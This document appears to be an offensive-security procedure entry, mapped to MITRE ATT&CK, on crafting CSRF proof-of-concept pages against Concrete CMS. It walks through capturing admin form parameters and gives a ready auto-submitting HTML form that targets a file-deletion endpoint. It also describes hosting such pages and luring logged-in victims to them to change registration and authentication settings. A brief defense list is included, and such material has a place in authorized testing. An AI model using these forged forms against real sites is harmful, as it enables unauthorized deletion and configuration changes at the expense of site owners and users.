---
id: 123e4567-e89b-12d3-a456-426614174002
name: Craft-CSRF-Proof-of-Concept-HTML-Pages
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:15.463Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Drive-by Compromise]]'
sub_techniques: []
tags:
  - csrf
  - exploit-development
  - html-forgery
platforms:
  - Web
commands: []
tools: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---

# Craft CSRF Proof-of-Concept HTML Pages

## Summary

This procedure details the creation of malicious HTML forms that auto-submit POST requests to vulnerable Concrete CMS endpoints, exploiting the absence of CSRF validation to perform unauthorized actions.

## Description

Based on identified vulnerabilities, craft standalone HTML pages with hidden form fields replicating legitimate POST data and JavaScript for automatic submission. Targets include endpoints like file deletion (/index.php/tools/required/files/delete) and registration updates. The attack scenario involves hosting these pages and luring victims to them, leading to actions such as enabling public registration or modifying authentication settings without consent. Prerequisites include knowledge of vulnerable parameters from reconnaissance.

## Requirements

1. List of vulnerable endpoints and their required POST parameters
2. Text editor (e.g., VS Code) for HTML/JavaScript creation
3. Web server to host the PoC pages

## Defense

Defensive measures and detection strategies:

- Enforce strict referrer policy and same-origin checks
- Monitor for unexpected POST requests from external domains
- Educate users on phishing risks and link verification

## Objectives

1. Build functional PoC forms for specific CSRF vulnerabilities
2. Ensure auto-submission bypasses user interaction
3. Test forms against a staging instance for validation

## Instructions

### Step 1: Analyze Legitimate Form Data

**Context**: Capture exact parameters from a legitimate request to replicate in the forged form.

Perform a valid action in the admin panel and use browser dev tools to note form fields, such as file IDs for deletion or registration type values.

### Step 2: Construct HTML Form

**Context**: Create a basic HTML structure with hidden inputs and target the vulnerable URL.

Write an HTML file like:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf-form" action="http://target.com/index.php/tools/required/files/delete" method="POST">
<input type="hidden" name="fileID" value="123">
</form>
<script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```
Adjust action and fields for each endpoint (e.g., add registration_type for public settings).

### Step 3: Test the PoC

**Context**: Verify the form submits correctly and triggers the action when loaded in an authenticated session.

Host the file and load it in a browser with an active admin session to the target; confirm the action completes without errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[exploit-development]]
- [[html-forgery]]
